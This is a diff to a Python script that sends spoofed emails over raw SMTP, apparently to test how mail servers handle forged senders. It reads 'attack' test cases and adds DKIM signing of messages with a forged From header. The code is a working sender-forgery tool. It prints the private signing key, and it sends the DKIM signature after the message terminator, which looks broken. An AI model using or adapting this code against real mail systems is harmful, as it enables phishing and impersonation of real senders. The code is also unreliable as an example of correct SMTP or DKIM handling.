@@ -4,10 +4,14 @@ import base64
 import ssl
 from config import *
 import test_cases
+import dkim
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+import inspect
+
 
 
 def mail_sender(attack_case):
-    print("Connecting to mail server")
     clientSocket = socket(AF_INET, SOCK_STREAM)
     print("Connecting to mail server")
     clientSocket.connect(receiving_mail_server)
@@ -22,13 +26,15 @@ def mail_sender(attack_case):
     clientSocket.send(b'STARTTLS\r\n')
     print_receiving_msg("STARTTLS", "220", clientSocket)
 
+    #if (tls_enabled):
+
     tlsSocket = ssl.wrap_socket(clientSocket, ssl_version=ssl.PROTOCOL_TLS)
 
-    #Login for attacker, not needed when we have email server
-    auth_msg = b'AUTH PLAIN '+base64.b64encode(b'\x00'+ sender_email.encode() +b'\x00'+password.encode())+b'\r\n'
-    print(auth_msg.decode())
-    tlsSocket.send(auth_msg)
-    print_receiving_msg_tls("Authentication", "235",tlsSocket)
+    ##Login for attacker, not needed when we have email server
+    #auth_msg = b'AUTH PLAIN '+base64.b64encode(b'\x00'+ sender_email.encode() +b'\x00'+password.encode())+b'\r\n'
+    #print(auth_msg.decode())
+    #tlsSocket.send(auth_msg)
+    #print_receiving_msg_tls("Authentication", "235",tlsSocket)
 
     #SMTP MAIL FROM
     MAIL_FROM = attack_case["mailfrom"]
@@ -57,13 +63,58 @@ def mail_sender(attack_case):
     subject = attack_case["data"]["subject_header"]
     print(subject)
     tlsSocket.send(subject)
-    message = attack_case["data"]["message"]
+    body = attack_case["data"]["body"]
     endmsg = "\r\n.\r\n"
-    print(message)
-    tlsSocket.send(message)
+    print(body)
+    tlsSocket.send(body)
     print(endmsg)
     tlsSocket.send(endmsg.encode())
 
+    
+    if "dkim" in attack_case.keys(): # if there is dkim
+        dkim_para = attack_case["dkim"];
+        print("preparing DKIM signature")
+        f = open("dkimkey","r")
+        pkey = f.read()
+        print(pkey)
+
+        headers = [b"To",b"From", b"Subject"]
+
+
+        #print(body.decode())
+        #print(type(body.decode()))
+        #print(dkim_para["s"].decode())
+        #print(type(dkim_para["s"].decode()))
+        #print(dkim_para["d"].decode())
+        #print(type(dkim_para["d"].decode()))
+        #print(pkey)
+        #print(type(pkey))
+        #print(headers)
+        #print(type(headers))
+
+        message_html = ""
+        MIMEmessage = MIMEMultipart("alternative")
+        MIMEmessage.attach(MIMEText(body.decode(), "plain"))
+        MIMEmessage.attach(MIMEText(message_html, "html"))
+        MIMEmessage["To"] = TO.decode()
+        MIMEmessage["From"] = fakefrom.decode()
+        MIMEmessage["Subject"] = subject.decode()
+
+
+        import inspect
+        lines = inspect.getsource(dkim.sign)
+        print(lines)
+
+        sig = dkim.sign(
+            message = MIMEmessage.as_string().encode(),
+            selector=dkim_para["s"],
+            domain=dkim_para["d"],
+            privkey=pkey.encode(),
+            canonicalize=(b'simple',b'relaxed'),
+            include_headers=[b"from"],
+        )
+        print(sig)
+        tlsSocket.send(sig)
 
     #quit command
     tlsSocket.send(b'quit\r\n')
@@ -85,11 +136,10 @@ def print_receiving_msg_tls(request, exp_code, tlsSocket):
     if (recv[0:3] != exp_code):
         print(exp_code + ' reply not received from server.')
 
-#server = smtplib.SMTP('smtp.gmail.com', 587)
-#server.starttls()
-#server.login(sender_email, password)
-#print("sending email")
-#server.sendmail(sender_email, receiver_email, message)
 
 
 
+if __name__ == '__main__':
+    print("Sending spoof emails based on test cases")
+    print (test_cases.test_list["attack1"]["mailfrom"].decode())
+    mail_sender(test_cases.test_list["attack2"])
